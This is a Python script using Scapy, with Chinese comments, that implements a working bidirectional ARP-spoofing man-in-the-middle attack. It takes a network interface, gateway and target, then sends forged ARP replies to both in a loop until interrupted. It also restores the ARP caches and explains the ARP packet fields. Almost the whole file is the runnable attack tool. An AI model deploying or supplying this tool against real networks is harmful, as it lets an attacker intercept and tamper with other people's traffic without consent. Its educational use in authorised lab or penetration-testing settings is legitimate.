#-*- coding:utf-8 -*-
from scapy.all import *
import sys
from optparse import OptionParser

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    '''
    arp缓存恢复
    '''
    print("[*] 恢复ARP缓冲....")
    #同样构造ARP包
    #hwdst="ff:ff:ff:ff:ff:ff"表示以广播的形式发送。
    #网关发送给目标主机:发送网关的MAC给目标主机，网关的IP和MAC就在ARP表中对应上了
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    # 目标主机发送给网关:发送目标主机的MAC给网关，目标主机的IP和MAC就在ARP表中对应上了
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    sys.exit(0)
def attact_target(gateway_ip,gateway_mac,target_ip,target_mac):
    '''
    进行双向欺骗
    '''
    '''
    首先通过scapy构造ARP包，以太网头部使用默认可以忽略
    默认以太网头部
    dst        : DestMACField                        = 'ff:ff:ff:ff:ff:ff' (None)
    src        : SourceMACField                      = '00:0c:29:35:f9:e3' (None)
    type       : XShortEnumField                     = 36864           (36864)
    ARP报文的格式
    hwtype     : XShortField                         = 1               (1)
    ptype      : XShortEnumField                     = 2048            (2048)
    hwlen      : FieldLenField                       = None            (None)
    plen       : FieldLenField                       = None            (None)
    op         : ShortEnumField                      = 1               (1)
    hwsrc      : MultipleTypeField                   = '00:0c:29:35:f9:e3' (None)
    psrc       : MultipleTypeField                   = '192.168.43.100' (None)
    hwdst      : MultipleTypeField                   = None            (None)
    pdst       : MultipleTypeField                   = None            (None)
    我们只关注这几个属性
    op:操作码，默认1，1为请求包，2为响应包
    hwsrc:原MCA地址
    psrc:原IP地址，可以用来伪装
    hwdst:目的MAC地址
    pdst：目的IP地址
    '''
    #构造ARP包,发给目标主机,将网关的IP包装成自己IP,告诉目标主机我是网关，我的mac是hwsrc(本机的默认MAC），将网关IP绑定跟本机MAC绑定
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc=gateway_ip
    poison_target.pdst=target_ip
    poison_target.hwdst=target_mac
    #构造ARP包,发给网关,将目的主机的IP包装成自己的IP,告诉网关我是目的主机，我的mac是hwsrc(本机的默认MAC），将目的主机的IP跟本机MAC绑定
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    print("[*]正在进行ARP投毒.[CTRL-C 停止]")
    while True:
        try:
            #循环发送ARP包
            send(poison_target)
            send(poison_gateway)
            #休眠一下，避免太频繁了，影响网络
            time.sleep(2)
        #捕获键盘终止
        except KeyboardInterrupt:
            #进行ARP缓存的恢复
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    print("[*] ARP投毒结束")
def mian():

    #使用命令行进行提示提示
    '''
    格式是：
    '''
    usage= 'sudo python3 arpspoof[-i interface] [-c own | host | both][-t target] [-r]host'
    parser = OptionParser(usage)

    parser.add_option('-i',dest='interface',type='string',help="网卡")
    parser.add_option('-g', dest='gateway', type='string', help="网关")
    #解析命令行
    (options,args) = parser.parse_args()
    if len(args) !=1 or options.interface is None or options.gateway is None:
        #输出提示
        parser.print_help()
        sys.exit(0)
    #kaill linux 的网卡地址
    interface=options.interface
    #网关的地址
    gateway_ip=options.gateway
    #目标的IP地址
    target_ip=args[0]

    #设置网卡
    conf.iface = interface
    #关闭错误的信息
    conf.verb = 0

    print("[*] 网卡： %s"%interface)
    #从ARP中获取网卡的MAC
    gateway_mac = getmacbyip(gateway_ip)
    if gateway_mac is None:
        print("[!] 获取网关的MAC失败，退出")
        sys.exit(0)
    else:
        print("[*]网关： %s: %s"%(gateway_ip,gateway_mac))
    #从ARP中获取目标主机的MAC
    target_mac = getmacbyip(target_ip)

    if target_mac is None:
        print("[!] 获取目标主机MAC失败。退出")
        sys.exit(0)
    else:
        print("[*] 目标主机： %s MAC: %s"%(target_ip,target_mac))
    attact_target(gateway_ip, gateway_mac, target_ip, target_mac)
if __name__=="__main__":
    mian()
